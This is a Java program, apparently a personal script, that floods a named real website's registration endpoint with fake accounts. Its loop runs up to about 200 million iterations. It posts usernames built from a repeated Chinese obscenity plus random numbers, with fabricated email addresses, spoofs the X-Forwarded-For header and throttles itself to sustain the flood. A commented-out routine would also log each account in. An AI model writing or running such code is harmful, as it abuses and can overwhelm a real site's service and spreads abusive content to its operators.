package net.dingyabin.thread;

import com.alibaba.fastjson.JSONObject;
import net.wecash.utils.HTTPClient;
import org.apache.commons.lang3.RandomUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.http.Header;
import org.apache.http.message.BasicHeader;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * Created by MrDing
 * Date: 2020/3/17.
 * Time:1:00
 */
public class Destroy {

    private static ThreadPoolExecutor executorService = new ThreadPoolExecutor(1, 1,
            0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());

//    private static ThreadPoolExecutor loginExecutorService = new ThreadPoolExecutor(1, 1,
//            0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());

    private static Header[] registerHeaders = new BasicHeader[]{
            new BasicHeader(":authority", "www.tyjys.com"),
            new BasicHeader(":method", "POST"),
            new BasicHeader(":path", "/reg"),
            new BasicHeader(":scheme", "https"),
            new BasicHeader("accept", "application/json, text/javascript, */*; q=0.01"),
            new BasicHeader("accept-encoding", "gzip, deflate, br"),
            new BasicHeader("accept-language", "zh-CN,zh;q=0.8"),
            new BasicHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8"),
            new BasicHeader("origin", "https://www.tyjys.com"),
            new BasicHeader("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"),
            new BasicHeader("x-requested-with", "XMLHttpRequest"),
            new BasicHeader("x-forwarded-for", "127.0.0.1")
    };

    private static Header[] loginHeaders = new BasicHeader[]{
            new BasicHeader(":authority", "www.tyjys.com"),
            new BasicHeader(":method", "POST"),
            new BasicHeader(":path", "/user"),
            new BasicHeader(":scheme", "https"),
            new BasicHeader("accept", "application/json, text/javascript, */*; q=0.01"),
            new BasicHeader("accept-encoding", "gzip, deflate, br"),
            new BasicHeader("accept-language", "zh-CN,zh;q=0.8"),
            new BasicHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8"),
            new BasicHeader("origin", "https://www.tyjys.com"),
            new BasicHeader("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"),
            new BasicHeader("x-requested-with", "XMLHttpRequest"),
            new BasicHeader("x-forwarded-for", "127.0.0.1")
    };



    public static void main(String[] args) throws InterruptedException {
        for (int i = 47754; i < 200000000; i++) {
            String nextLong = RandomUtils.nextLong(1000L, 9000000000000L) + "";
            String name = "操你妈操你妈操你妈" + nextLong + "_" + i;
            executorService.submit(() -> {
                boolean reg = reg(name, name, nextLong);
                if (reg) {
                    System.out.println("--*****************---" + name);
                    //登录
                    //loginExecutorService.submit(() -> login(name, name));
                }
            });
            if (executorService.getQueue().size() > 10) {
                System.out.println("线程任务积压，休息15s");
                Thread.sleep(15000);
            }
        }
        executorService.awaitTermination(10000, TimeUnit.DAYS);
        executorService.shutdown();
    }



    private static void login(String name ,String pwd) {
        try {
            Map<String, String> loginMap = new HashMap<>();
            loginMap.put("username", name);
            loginMap.put("password", pwd);
            loginMap.put("referurl", "https://www.tyjys.com/");
            loginMap.put("website", "website");
            HTTPClient.postMap("https://www.tyjys.com/user", loginMap, loginHeaders);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private static boolean reg(String name, String pwd, String email) {
        try {
            Map<String, String> map = new HashMap<>();
            map.put("username", name);
            map.put("password", pwd);
            map.put("password2", pwd);
            map.put("users_[email_2]", email + "1234567890987654321@qq.com");
            String s = HTTPClient.postMap("https://www.tyjys.com/reg", map, registerHeaders);
            if (StringUtils.isNotBlank(s) && s.startsWith("{")) {
                JSONObject jsonObject = JSONObject.parseObject(s);
                return "注册成功！".equals(jsonObject.getString("msg"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }


}
